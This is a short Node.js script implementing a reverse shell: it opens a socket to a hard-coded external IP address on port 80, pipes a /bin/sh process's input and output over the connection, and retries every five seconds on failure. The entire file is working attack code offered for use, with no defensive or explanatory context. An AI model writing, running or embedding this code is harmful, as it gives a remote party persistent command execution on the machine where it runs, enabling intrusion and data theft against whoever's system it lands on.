const net = require("net");
const { spawn } = require("child_process");

function reverseShell(host, port) {
  const client = new net.Socket();

  client.connect(port, host, () => {
    const sh = spawn("/bin/sh", []);
    client.write("Connected!\n");
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });

  client.on("error", (err) => {
    console.error("Connection error:", err);
    setTimeout(() => reverseShell(host, port), 5000); // Reconnect on failure
  });
}

// Call the reverse shell function (replace with your IP and port)
reverseShell("3.80.158.102", 80);
